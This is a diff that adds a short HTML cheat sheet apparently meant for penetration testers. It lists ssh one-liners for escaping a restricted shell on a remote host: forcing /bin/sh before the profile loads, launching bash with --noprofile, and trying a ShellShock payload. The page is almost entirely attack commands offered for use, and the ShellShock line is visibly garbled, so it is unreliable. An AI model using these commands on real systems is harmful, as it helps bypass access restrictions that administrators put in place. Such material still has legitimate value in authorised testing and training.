@@ -1,0 +1,12 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>SSH</title>
+</head><body>Use SSH on your machine to exec commands before the remote shell is loaded:<br/>
+	ssh &lt;RHOST&gt;@&lt;RHOST&gt; -t &quot;/bin/sh&quot;<br/>
+<br/>
+Start remote shell without loading the &quot;rc&quot; profile (where most limitations are often configured)<br/>
+	ssh &lt;RHOST&gt;@&lt;RHOST&gt; -t &quot;bash --noprofile&quot;<br/>
+<br/>
+Try ShellShock on vulnerable shell implementations<br/>
+	ssh &lt;RHOST&gt;@&lt;RHOST&gt; -t &quot;() P :; }; /bin/bash&quot;</body></html>
